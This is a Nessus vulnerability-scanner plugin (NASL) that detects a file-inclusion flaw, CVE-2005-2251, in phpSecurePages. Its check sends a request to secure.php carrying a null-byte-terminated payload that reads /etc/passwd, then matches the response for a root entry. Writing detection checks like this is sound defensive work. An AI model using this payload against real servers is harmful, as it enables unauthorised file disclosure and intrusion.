#
# (C) Tenable Network Security
#


if (description) {
  script_id(18659);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2251");
  script_bugtraq_id(14201);

  name["english"] = "phpSecurePages cfgProgDir Variable File Include Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains several PHP scripts that may allow
arbitrary code execution and local file disclosure. 

Description :

The remote host is running phpSecurePages, a PHP module used to secure
pages with a login name / password. 

The installed version of phpSecurePages allows remote attackers to
control the 'cfgProgDir' variable used when including PHP code in
several of the application's scripts.  By leveraging this flaw, an
attacker may be able to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts. 

See also : 

http://secunia.com/advisories/15994/ 

Solution : 

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for cfgProgDir variable file include vulnerabilities in phpSecurePages";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/secure.php?",
      "cfgProgDir=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream".
    #
    # nb: this suggests magic_quotes_gpc was enabled; passing 
    #     remote URLs might still work though.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream")
  ) {
    security_hole(port);
    exit(0);
  }
}
